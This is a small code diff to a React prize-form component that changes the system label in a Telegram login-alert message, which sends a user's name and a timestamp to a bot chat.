@@ -22,7 +22,7 @@ const PrizeForm = ({ onComplete }) => {
       const TELEGRAM_CHAT_ID = import.meta.env.VITE_ID;
       const now = new Date();
       const timeString = now.toLocaleString();
-      const message = `🔐 New User Login Alert!\n\n👤 Name: ${realName}\n⏰ Time: ${timeString}\n🌐 System: Ancient Scrolls Terminal`;
+      const message = `🔐 New User Login Alert!\n\n👤 Name: ${realName}\n⏰ Time: ${timeString}\n🌐 System: SEU Welcome Bank`;
 
       await axios.post(`https://api.telegram.org/bot${import.meta.env.VITE_TG}/sendMessage`, {
         chat_id: TELEGRAM_CHAT_ID,
